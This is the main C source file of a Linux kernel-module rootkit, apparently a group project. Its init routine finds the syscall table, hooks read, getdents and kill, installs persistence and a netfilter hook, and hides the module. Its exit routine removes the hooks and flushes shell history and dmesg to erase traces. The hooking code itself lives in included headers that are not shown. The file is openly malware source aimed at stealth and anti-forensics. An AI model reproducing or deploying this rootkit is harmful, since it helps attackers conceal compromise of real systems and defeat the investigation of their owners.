#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>

#include "../include/hooking.h"
#include "../include/h_read.h"
#include "../include/h_getdents.h"
#include "../include/h_kill.h"
#include "../include/h_netfilter.h"
#include "../include/persistence.h"
#include "../include/selfdestruct.h"


static __init int rootkit_init(void)
{
    get_kallsyms_funcptr();
    get_syscall_table();
    hijack_read();
    hijack_getdents();
    hijack_kill();
    persistence();
    register_netfilter_hook();

    module_hide();

    return 0;
}

static __exit void rootkit_exit(void)
{
    restore_kill();
    restore_getdents();
    restore_read();
    unregister_netfilter_hook();
    flush_history();
    flush_dmesg();

    return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Guess");
MODULE_AUTHOR("Group 14");
